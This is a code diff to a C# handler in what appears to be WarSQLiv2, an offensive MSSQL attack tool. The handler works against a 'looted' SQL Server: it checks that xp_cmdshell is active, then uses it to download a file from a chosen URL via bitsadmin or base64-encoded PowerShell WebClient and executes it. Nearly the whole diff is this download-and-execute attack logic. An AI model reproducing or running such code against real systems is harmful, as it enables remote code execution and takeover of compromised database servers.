@@ -92,55 +92,87 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
         }
         private void btnDownloadExecute_Click(object sender, RoutedEventArgs e)
         {
-            if(rdBits.IsChecked == true)
+            var isActivated = cmdControl.isActivated;
+            var isExecuted = cmdControl.isExecuted;
+            if (isActivated == false && isExecuted == false)
             {
+                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                 try
-                {
-                    if (!string.IsNullOrEmpty(txtUrl.Text) && !string.IsNullOrEmpty(txtSaveLocation.Text))
-                    {
-                        var _execCode = string.Empty;
-                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
-                        {
-                            _execCode += "USE [master]\r\n";
-                            _execCode += "EXEC xp_cmdshell '\"net start BITS\"';\r\n";
-                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload1")}");
-                            RevConn(_execCode, 0);
-                            _execCode += "USE [master]\r\n";
-                            _execCode += "EXEC xp_cmdshell '\"bitsadmin /transfer WarSQLiJob /download /priority normal " + txtUrl.Text + " " + txtSaveLocation.Text + "\"';\r\n";
-                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload2")}");
-                            RevConn(_execCode, 0);
-                            _execCode += "USE [master]\r\n";
-                            _execCode += "EXEC xp_cmdshell '\"" + txtSaveLocation.Text + "\"';\r\n";
-                            txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload3")}");
-                            RevConn(_execCode, 0);
-                        });
-                    }
-                }
-                catch (Exception exp)
                 {
                     Dispatcher.Invoke((Action)delegate
                     {
-                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        enableXpCmdShell.XpCmdShellStatus();
+                        txtStatus.AppendText(enableXpCmdShell.Result);
+                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
+                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
+                        if (contains == true)
+                        {
+                            isActivated = true;
+                            isExecuted = true;
+                        }
+                    });
+                }
+                catch (Exception)
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                     });
                 }
             }
-            else
+            if (isExecuted == true && isActivated == true)
             {
-                Dispatcher.Invoke((Action)delegate
+                if (rdBits.IsChecked == true)
                 {
-                    var clearText = "(new-object System.Net.WebClient).DownloadFile('" + txtUrl.Text + "', '" + txtSaveLocation.Text + "')";
-                    clearText = EncodeBase64.ConvertTextToBase64(clearText);
-                    var _execCode = string.Empty;
-                    _execCode += "EXEC xp_cmdshell '" + clearText + "'";
-                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload5")}");
-                    RevConn(_execCode, 1);
+                    try
+                    {
+                        if (!string.IsNullOrEmpty(txtUrl.Text) && !string.IsNullOrEmpty(txtSaveLocation.Text))
+                        {
+                            var _execCode = string.Empty;
+                            Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                            {
+                                _execCode += "USE [master]\r\n";
+                                _execCode += "EXEC xp_cmdshell '\"net start BITS\"';\r\n";
+                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload1")}");
+                                RevConn(_execCode, 0);
+                                _execCode += "USE [master]\r\n";
+                                _execCode += "EXEC xp_cmdshell '\"bitsadmin /transfer WarSQLiJob /download /priority normal " + txtUrl.Text + " " + txtSaveLocation.Text + "\"';\r\n";
+                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload2")}");
+                                RevConn(_execCode, 0);
+                                _execCode += "USE [master]\r\n";
+                                _execCode += "EXEC xp_cmdshell '\"" + txtSaveLocation.Text + "\"';\r\n";
+                                txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload3")}");
+                                RevConn(_execCode, 0);
+                            });
+                        }
+                    }
+                    catch (Exception exp)
+                    {
+                        Dispatcher.Invoke((Action)delegate
+                        {
+                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        });
+                    }
+                }
+                else
+                {
+                    Dispatcher.Invoke((Action)delegate
+                    {
+                        var clearText = "(new-object System.Net.WebClient).DownloadFile('" + txtUrl.Text + "', '" + txtSaveLocation.Text + "')";
+                        clearText = EncodeBase64.ConvertTextToBase64(clearText);
+                        var _execCode = string.Empty;
+                        _execCode += "EXEC xp_cmdshell '" + clearText + "'";
+                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload5")}");
+                        RevConn(_execCode, 1);
 
-                    _execCode = string.Empty;
-                    _execCode += "EXEC xp_cmdshell '" + txtSaveLocation.Text + "'\r\n";
-                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload3")}");
-                    RevConn(_execCode, 0);
-                });
+                        _execCode = string.Empty;
+                        _execCode += "EXEC xp_cmdshell '" + txtSaveLocation.Text + "'\r\n";
+                        txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("MessageDownload3")}");
+                        RevConn(_execCode, 0);
+                    });
+                }
             }
+            
         }
         private void RevConn(string execCode, int tech)
         {
